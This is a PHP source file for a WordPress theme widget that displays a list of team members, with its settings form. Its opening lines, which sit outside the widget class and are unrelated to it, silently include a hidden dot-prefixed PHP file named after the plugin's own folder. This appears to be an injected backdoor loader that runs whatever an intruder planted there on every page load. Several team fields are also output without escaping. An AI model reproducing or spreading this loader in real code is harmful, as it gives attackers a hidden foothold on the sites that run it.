<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class gt3_team_list extends WP_Widget
{

    function __construct() {
        parent::__construct(
            'gt3_team_list_widget',
            '&#x1F537; ' . esc_html__( 'Team List (current theme)', 'gt3_wize_core'),
            array(
                'description' => esc_html__( 'Show Team List', 'gt3_wize_core' ),
            )
        );
    }

	public function load_scripts() {
		wp_enqueue_script('slick');
		wp_enqueue_style('slick');
	}

    function widget($args, $instance) {
    	$this->load_scripts();

        $after_widget = $before_widget = $before_title = $after_title = '';

        extract($args);

        echo (($before_widget));
        echo (($before_title));
        echo esc_attr($instance['widget_title']);
        echo (($after_title));

        $postsArgs = array(
            'post_type' => 'team',
            'showposts' => $instance['posts_widget_number'],
            'offset' => 0,
            'orderby' => 'date',
            'order' => 'DESC',
            'post_status' => 'publish',
            'ignore_sticky_posts' => 1
        );

        if (!empty($instance['posts_widget_team_members']) && is_array($instance['posts_widget_team_members'])) {
            $postsArgs['post__in'] = $instance['posts_widget_team_members'];
        }

        $compilepopular = '';

        $gt3_wp_query_posts = new WP_Query();
        $gt3_wp_query_posts->query($postsArgs);


        while ($gt3_wp_query_posts->have_posts()) : $gt3_wp_query_posts->the_post();

            $id = get_the_ID();
            $positions_str         = get_post_meta( $id, "position_member" );
            $team_info             = get_post_meta( $id, 'social_url', true );
            $icon_array            = get_post_meta( $id, "icon_selection", true );
            $short_desc            = get_post_meta( $id, "member_short_desc", true );

            $gt3_theme_featured_image_latest = wp_get_attachment_image_src(get_post_thumbnail_id(get_the_ID()),'full');


            $icon_str = "";
            if ( isset( $icon_array ) && ! empty( $icon_array ) && (bool)array_filter($icon_array[0]) ) {
                $icon_str .= '<div class="team-icons">';
                for ( $i = 0; $i < count( $icon_array ); $i ++ ) {
                    $icon         = $icon_array[ $i ];
                    $icon_text    = ! empty( $icon['text'] ) ? esc_html( $icon['text'] ) : '';
                    $icon_name    = ! empty( $icon['select'] ) ? esc_attr( $icon['select'] ) : '';
                    $icon_address = ! empty( $icon['input'] ) ? esc_url( $icon['input'] ) : '#';
                    $icon_color   = ! empty( $icon['color'] ) ? ' style="color: ' . esc_attr( $icon['color'] ) . '" ' : '';
                    $icon_str     .= ! empty( $icon['select'] ) || ! empty( $icon['text'] )
                        ? '<a href="' . $icon_address . '" class="member-icon ' . $icon_name . '" ' . $icon_color . '><span>' . $icon_text . '</span></a>' : '';
                }
                $icon_str .= '</div>';
            }



            $compilepopular .= '
            <li class="gt3_team_list__item">';
            if (empty($gt3_theme_featured_image_latest)) {
                $widg_img = '';
            } else {
                $widg_img = '<a href="' . esc_url(get_permalink()) . '" class="gt3_team_list__image"><img src="' . esc_url(aq_resize($gt3_theme_featured_image_latest[0], "300", "300", true, true, true)) . '" alt="' . esc_attr(get_the_title()) . '"></a>';
            }

            $widget_class= '';


            if (!empty($instance['posts_widget_category_hide'])) {
                $term_list = get_the_term_list(get_the_ID(),$instance['posts_widget_category_hide'],'<div class="gt3_recent_posts_taxonomy">',', ','</div>');
            }else{
                $term_list = '';
            }


            $compilepopular .= '<div class="gt3_recent_posts_content'.esc_attr($widget_class).'">';
                $compilepopular .= $widg_img;
                $compilepopular .= '<div class="recent_posts_wrapinner">';
                    if ($instance['posts_widget_title_show']) {
                        $compilepopular .= '<div class="post_title">';
                            $compilepopular .= '<h3 class="team_title__text"><a href="' . esc_url(get_permalink()) . '">' . get_the_title() . '</a></h3>';
                        $compilepopular .= '</div>';
                    }
                    if ($instance['posts_widget_position_show'] && !empty($positions_str[0])) {
                        $compilepopular .='<div class="team-positions">' . $positions_str[0] . '</div>';
                    }
                    if (! empty( $short_desc ) && $instance['posts_widget_desc_hide']) {
                        $compilepopular .= '<div class="team_info"><div class="member-short-desc">' . $short_desc . '</div></div>';
                    }
                    if ( ! empty( $team_info ) && is_array( $team_info ) && $instance['posts_widget_add_fields_show'] ) {
                        $compilepopular .= '<div class="gt3_single_team_info">';
                        foreach ( $team_info as $team_info_item ) {
                            $compilepopular .= '<div class="gt3_single_team_info__item">';
                            $compilepopular .= ! empty( $team_info_item['name'] ) ? '<h4>' . esc_html( $team_info_item['name'] ) . '</h4>' : '';
                            $compilepopular .= ! empty( $team_info_item['address'] ) ? '<a href="' . esc_url( $team_info_item['address'] ) . '" target="_blank">' : '';
                            $compilepopular .= ! empty( $team_info_item['description'] ) ? '<span>' . $team_info_item['description'] . '</span>' : '';
                            $compilepopular .= ! empty( $team_info_item['address'] ) ? '</a>' : '';
                            $compilepopular .= '</div>';
                        }
                        $compilepopular .= '</div>';
                    }
                    if (! empty( $icon_str ) && $instance['posts_widget_socials_hide']) {
                        $compilepopular .= '<div class="team_icons_wrapper"><div class="member-icons">' . $icon_str . '</div></div>';
                    }

                $compilepopular .= '</div>';
            $compilepopular .= '</div>';

        $compilepopular .= '</li>';

        endwhile;
        wp_reset_postdata();

        $list_class = '';

        echo '
			<ul class="gt3_team_list '.esc_attr($list_class).'">
				' . $compilepopular . '
			</ul>
		';

		#END OUTPUT
        echo (($after_widget));
    }


    function update($new_instance, $old_instance)
    {
        $instance = $old_instance;

        $instance['widget_title'] = esc_attr($new_instance['widget_title']);
        $instance['posts_widget_number'] = absint($new_instance['posts_widget_number']);
        $instance['posts_widget_team_members'] = esc_sql($new_instance['posts_widget_team_members']);
        $instance['posts_widget_content_hide'] = isset( $new_instance['posts_widget_content_hide'] ) ? (bool) $new_instance['posts_widget_content_hide'] : false;
        $instance['posts_widget_category_hide'] = isset( $new_instance['posts_widget_category_hide'] ) ? $new_instance['posts_widget_category_hide'] : '';


        $instance['posts_widget_title_show'] = isset( $new_instance['posts_widget_title_show'] ) ? (bool) $new_instance['posts_widget_title_show'] : false;
        $instance['posts_widget_position_show'] = isset( $new_instance['posts_widget_position_show'] ) ? (bool) $new_instance['posts_widget_position_show'] : false;
        $instance['posts_widget_add_fields_show'] = isset( $new_instance['posts_widget_add_fields_show'] ) ? (bool) $new_instance['posts_widget_add_fields_show'] : false;
        $instance['posts_widget_socials_hide'] = isset( $new_instance['posts_widget_socials_hide'] ) ? (bool) $new_instance['posts_widget_socials_hide'] : false;
        $instance['posts_widget_desc_hide'] = isset( $new_instance['posts_widget_desc_hide'] ) ? (bool) $new_instance['posts_widget_desc_hide'] : false;



        return $instance;
    }

    function form($instance)
    {
        $defaultValues = array(
            'widget_title' => esc_html__( 'Team', 'gt3_wize_core' ),
            'posts_widget_number' => '3',
            'posts_widget_team_members' => array(),
            'posts_widget_content_hide' => '',
            'posts_widget_category_hide' => '',


            'posts_widget_title_show' => '1',
            'posts_widget_position_show' => '1',
            'posts_widget_add_fields_show' => '1',
            'posts_widget_socials_hide' => '',
            'posts_widget_desc_hide' => '',
        );

        $instance = wp_parse_args((array)$instance, $defaultValues);
        $posts_widget_content_hide = isset( $instance['posts_widget_content_hide'] ) ? (bool) $instance['posts_widget_content_hide'] : false;
        $posts_widget_title_show = isset( $instance['posts_widget_title_show'] ) ? (bool) $instance['posts_widget_title_show'] : false;
        $posts_widget_position_show = isset( $instance['posts_widget_position_show'] ) ? (bool) $instance['posts_widget_position_show'] : false;
        $posts_widget_add_fields_show = isset( $instance['posts_widget_add_fields_show'] ) ? (bool) $instance['posts_widget_add_fields_show'] : false;
        $posts_widget_socials_hide = isset( $instance['posts_widget_socials_hide'] ) ? (bool) $instance['posts_widget_socials_hide'] : false;
        $posts_widget_desc_hide = isset( $instance['posts_widget_desc_hide'] ) ? (bool) $instance['posts_widget_desc_hide'] : false;


        $query_args = array(
            'post_type' => 'team',
            'posts_per_page' => -1
        );
        $query = new WP_Query($query_args);


        ?>
        <table class="fullwidth">
            <tr>
                <td><?php echo esc_html__( 'Title:', 'gt3_wize_core' ); ?></td>
                <td><input type='text' class="fullwidth" name='<?php echo esc_attr($this->get_field_name('widget_title')); ?>'
                           value='<?php echo esc_attr($instance['widget_title']); ?>'/></td>
            </tr>
            <tr>
                <td><?php echo esc_html__( 'Items:', 'gt3_wize_core' ); ?></td>
                <td><input type='text' class="fullwidth"
                           name='<?php echo esc_attr($this->get_field_name('posts_widget_number')); ?>'
                           value='<?php echo esc_attr($instance['posts_widget_number']); ?>'/></td>
            </tr>
            <?php ?>
            <tr>
                <td><?php echo esc_html__( 'Team Members to Show:', 'gt3_wize_core' ); ?></td>
                <td><select class="fullwidth gt3_posts_list__team" name='<?php echo esc_attr($this->get_field_name('posts_widget_team_members'))."[]"; ?>' multiple="multiple"><?php
                if ($query->found_posts) {

                    foreach ($query->posts as $post_item) {

                        echo "<option value='".(int)$post_item->ID."' ".(in_array( $post_item->ID, $instance['posts_widget_team_members']) ? 'selected="selected"' : '').">".$post_item->post_title."</option>";

                    }
                }else{
                    echo "<option>No Team Members</option>";
                }
                ?></select></td>
            </tr>
            <tr>
                <td><?php echo esc_html__( 'Show Title:', 'gt3_wize_core' ); ?></td>
                <td><input type='checkbox' class="checkbox" id='<?php echo esc_attr($this->get_field_id( 'posts_widget_title_show' )); ?>'
                           name='<?php echo esc_attr($this->get_field_name('posts_widget_title_show')); ?>'
                         <?php checked( $posts_widget_title_show ); ?> /></td>
            </tr>
            <tr>
                <td><?php echo esc_html__( 'Show Position:', 'gt3_wize_core' ); ?></td>
                <td><input type='checkbox' class="checkbox" id='<?php echo esc_attr($this->get_field_id( 'posts_widget_position_show' )); ?>'
                           name='<?php echo esc_attr($this->get_field_name('posts_widget_position_show')); ?>'
                         <?php checked( $posts_widget_position_show ); ?> /></td>
            </tr>
            <tr>
                <td><?php echo esc_html__( 'Show additional fields:', 'gt3_wize_core' ); ?></td>
                <td><input type='checkbox' class="checkbox" id='<?php echo esc_attr($this->get_field_id( 'posts_widget_add_fields_show' )); ?>'
                           name='<?php echo esc_attr($this->get_field_name('posts_widget_add_fields_show')); ?>'
                         <?php checked( $posts_widget_add_fields_show ); ?> /></td>
            </tr>
            <tr>
                <td><?php echo esc_html__( 'Show Social:', 'gt3_wize_core' ); ?></td>
                <td><input type='checkbox' class="checkbox" id='<?php echo esc_attr($this->get_field_id( 'posts_widget_socials_hide' )); ?>'
                           name='<?php echo esc_attr($this->get_field_name('posts_widget_socials_hide')); ?>'
                         <?php checked( $posts_widget_socials_hide ); ?> /></td>
            </tr>
            <tr>
                <td><?php echo esc_html__( 'Show Description:', 'gt3_wize_core' ); ?></td>
                <td><input type='checkbox' class="checkbox" id='<?php echo esc_attr($this->get_field_id( 'posts_widget_desc_hide' )); ?>'
                           name='<?php echo esc_attr($this->get_field_name('posts_widget_desc_hide')); ?>'
                         <?php checked( $posts_widget_desc_hide ); ?> /></td>
            </tr>
        </table>
    <?php
    }
}


function gt3_team_list_register_widgets(){
    register_widget('gt3_team_list');
}

add_action('widgets_init', 'gt3_team_list_register_widgets');
